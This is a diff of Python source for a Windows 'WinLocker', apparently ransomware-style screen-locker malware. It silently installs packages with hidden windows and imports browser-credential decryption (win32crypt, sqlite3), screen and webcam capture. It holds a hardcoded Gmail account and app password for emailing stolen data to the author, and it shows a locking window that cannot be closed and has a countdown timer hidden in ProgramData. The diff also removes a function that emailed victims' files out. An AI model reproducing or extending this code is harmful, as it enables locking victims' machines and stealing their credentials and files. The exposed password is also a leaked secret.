@@ -1,4 +1,12 @@
-import subprocess, sys, os, time, threading, tempfile, tkinter as tk
+import subprocess, sys
+try:
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "pygame"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
+except: pass
+try:
+    subprocess.run(['winget', 'install', 'ffmpeg', '--accept-package-agreements', '--silent'], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+except: pass
+
+import os, sys, time, threading, tempfile, tkinter as tk
 from tkinter import PhotoImage
 import urllib.request, smtplib, socket, base64, random, re, json
 from email.mime.text import MIMEText
@@ -9,16 +17,6 @@ import cv2, numpy as np
 from PIL import ImageGrab
 import sqlite3, win32crypt, shutil, winreg, ctypes
 
-# ===== АВТО-УСТАНОВКА ВСЕХ БИБЛИОТЕК =====
-try:
-    subprocess.check_call([sys.executable, "-m", "pip", "install", "pygame"], 
-                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
-except: pass
-try:
-    subprocess.run(['winget', 'install', 'ffmpeg', '--accept-package-agreements', '--silent'], 
-                  capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
-except: pass
-
 PASSWORD = "1601"
 MAX_ATTEMPTS = 4
 TIMER_FILE = os.path.join(os.environ.get('PROGRAMDATA', 'C:\\ProgramData'), "Microsoft", "Windows", "timer.dat")
@@ -26,11 +24,9 @@ GMAIL_LOGIN = "xzx78848@gmail.com"
 GMAIL_APP_PASSWORD = "cbgr awth fvak xgfb"
 RECEIVER_EMAIL = "xzx78848@gmail.com"
 VIDEO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/fuxEcorp.mp4.mp4"
-AUDIO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/fuxEcorp.mp4.mp3"
 LOGO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/logo.png"
 LOCKER_MUSIC_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/Max_Quayle_-_Mr._Robot_OST_Main_Theme_(SkySound.cc).mp3"
 VIDEO_PATH = os.path.join(tempfile.gettempdir(), "fuxEcorp.mp4.mp4")
-AUDIO_PATH = os.path.join(tempfile.gettempdir(), "fuxEcorp.mp4.mp3")
 LOGO_PATH = os.path.join(tempfile.gettempdir(), "logo.png")
 LOCKER_MUSIC_PATH = os.path.join(tempfile.gettempdir(), "Max_Quayle_-_Mr._Robot_OST_Main_Theme_(SkySound.cc).mp3")
 attempts_left = MAX_ATTEMPTS
@@ -193,7 +189,6 @@ def anim_connect():
 def play_video():
     try:
         download_file(VIDEO_URL, VIDEO_PATH)
-        download_file(AUDIO_URL, AUDIO_PATH)
     except: return
     time.sleep(0.3)
     try:
@@ -202,15 +197,14 @@ def play_video():
         v.protocol("WM_DELETE_WINDOW", lambda: None)
         lbl = tk.Label(v, bg='black'); lbl.pack(expand=True, fill='both')
         
-        # Звук: сначала ffplay, потом pygame
+        # Звук из самого видео файла
         try:
-            subprocess.Popen(['ffplay','-nodisp','-autoexit','-loglevel','quiet', AUDIO_PATH], 
-                           shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
+            subprocess.Popen(['ffplay','-nodisp','-autoexit','-loglevel','quiet', VIDEO_PATH], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
         except:
             try:
                 import pygame
                 pygame.mixer.init()
-                pygame.mixer.music.load(AUDIO_PATH)
+                pygame.mixer.music.load(VIDEO_PATH)
                 pygame.mixer.music.play()
             except: pass
         
@@ -287,20 +281,6 @@ def send_email(msg, subj=None):
         s.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD); s.send_message(m); s.quit()
     except: pass
 
-def send_file_email(fp, desc):
-    try:
-        if not os.path.exists(fp): return
-        m = MIMEMultipart()
-        m['Subject'] = desc; m['From'] = GMAIL_LOGIN; m['To'] = RECEIVER_EMAIL
-        with open(fp, 'rb') as f:
-            p = MIMEBase('application', 'octet-stream'); p.set_payload(f.read())
-            encoders.encode_base64(p)
-            p.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(fp)}"')
-            m.attach(p)
-        s = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=10)
-        s.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD); s.send_message(m); s.quit()
-    except: pass
-
 class WinLocker:
     def __init__(self):
         self.root = tk.Tk(); self.root.withdraw()
@@ -324,9 +304,7 @@ class WinLocker:
         self.timer_label.place(relx=0.5, rely=0.1, anchor='center')
         self.update_timer()
         
-        # МУЗЫКА
         try:
-            subprocess.check_call([sys.executable, "-m", "pip", "install", "pygame"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
             download_file(LOCKER_MUSIC_URL, LOCKER_MUSIC_PATH)
             if os.path.exists(LOCKER_MUSIC_PATH) and os.path.getsize(LOCKER_MUSIC_PATH) > 1000:
                 import pygame
